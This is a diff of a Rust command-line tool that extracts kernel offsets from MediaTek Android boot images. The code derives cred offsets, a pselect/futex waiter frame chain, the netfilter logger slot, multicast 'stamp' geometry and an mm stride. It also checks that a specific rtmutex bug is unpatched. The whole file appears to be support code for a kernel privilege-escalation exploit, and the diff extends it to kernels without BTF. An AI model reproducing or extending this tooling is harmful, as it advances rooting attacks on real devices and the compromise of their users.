@@ -9,8 +9,9 @@ use ghostlock_extract::analysis;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
+    PSELECT_ROUTE_NFDS, derive_cred_5x, derive_mm_stride, derive_nf_logger_registration,
+    derive_pselect_layout, ensure_rtmutex_43499_unpatched, multicast_waiter_off,
+    relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
 use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
@@ -442,50 +443,52 @@ fn run(cli: &Cli) -> Result<i32> {
     // recorded here and re-checked after route selection instead of aborting.
     let mut pselect_infeasible: Option<String> = None;
     if !cli.no_disasm {
-        if let Some(btf) = &btf {
-            match derive_pselect_layout(
-                &boot.kernel,
-                &rel_symbols,
-                &sorted_offsets,
-                btf,
-                PSELECT_ROUTE_NFDS,
-            ) {
-                Ok(layout) => {
-                    let shift = layout.shift as i64 - 2;
-                    let frame_parts: Vec<String> = [
-                        "frame_pselect_wrapper",
-                        "frame_pselect_dispatch",
-                        "frame_pselect_core",
-                        "frame_futex_wrapper",
-                        "frame_futex_dispatch",
-                        "frame_futex_wait",
-                    ]
-                    .iter()
-                    .filter_map(|key| {
-                        layout.frames.get(*key).map(|value| {
-                            format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
-                        })
+        // pselect needs no BTF: its frames and the futex waiter come from the
+        // disassembly alone, which is what makes a BTF-less image usable.
+        match derive_pselect_layout(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+            PSELECT_ROUTE_NFDS,
+        ) {
+            Ok(layout) => {
+                let shift = layout.shift as i64 - 2;
+                let frame_parts: Vec<String> = [
+                    "frame_pselect_wrapper",
+                    "frame_pselect_dispatch",
+                    "frame_pselect_core",
+                    "frame_futex_wrapper",
+                    "frame_futex_dispatch",
+                    "frame_futex_wait",
+                ]
+                .iter()
+                .filter_map(|key| {
+                    layout.frames.get(*key).map(|value| {
+                        format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
                     })
-                    .collect();
-                    eprintln!(
-                        "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
-                         shift={shift} (derived {} - 2)",
-                        layout.chain,
-                        frame_parts.join(" "),
-                        layout.pselect_buffer,
-                        layout.waiter_local,
-                        layout.shift,
-                    );
-                    derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
-                }
-                Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
-                    pselect_infeasible = Some(message);
-                }
-                Err(err) => {
-                    eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
-                }
+                })
+                .collect();
+                eprintln!(
+                    "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
+                     shift={shift} (derived {} - 2)",
+                    layout.chain,
+                    frame_parts.join(" "),
+                    layout.pselect_buffer,
+                    layout.waiter_local,
+                    layout.shift,
+                );
+                derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
             }
+            Err(ExtractError::Infeasible(message)) => {
+                eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                pselect_infeasible = Some(message);
+            }
+            Err(err) => {
+                eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
+            }
+        }
+        if let Some(btf) = &btf {
             match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
                 Ok(info) => {
                     derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
@@ -499,7 +502,10 @@ fn run(cli: &Cli) -> Result<i32> {
                 }
             }
         } else {
-            eprintln!("warning: no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic");
+            eprintln!(
+                "info: no BTF; loggers_0_1 uses the fixed loggers[0][NF_LOG_TYPE_ULOG] \
+                 index (loggers + 8)"
+            );
         }
     } else {
         eprintln!(
@@ -536,6 +542,11 @@ fn run(cli: &Cli) -> Result<i32> {
         symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
     }
     let struct_offsets = resolve_structs(btf.as_ref());
+    let mm_stride = if cli.no_disasm {
+        None
+    } else {
+        derive_mm_stride(&boot.kernel, &rel_symbols, &sorted_offsets)
+    };
 
     let missing: Vec<String> = symbol_offsets
         .iter()
@@ -673,6 +684,13 @@ fn run(cli: &Cli) -> Result<i32> {
                      keeping the proven 5.x constant"
                 ),
             }
+            if !report::multicast_geometry_fits(&geometry) {
+                eprintln!(
+                    "error: the derived multicast stamp does not fit the option buffer; \
+                     this kernel has no usable multicast branch"
+                );
+                geometry.clear();
+            }
         }
         match route.as_deref() {
             Some(route) if geometry.is_empty() => eprintln!(
@@ -738,6 +756,7 @@ fn run(cli: &Cli) -> Result<i32> {
             route_geometry: &geometry,
             cred: &cred,
             extra_offsets: &extra_offsets,
+            mm_stride,
         })
     } else {
         let report_value = report::build_report(
@@ -748,6 +767,7 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             btf_size,
             pselect_shift,
+            mm_stride,
         );
         serde_json::to_string_pretty(&report_value).unwrap() + "\n"
     };
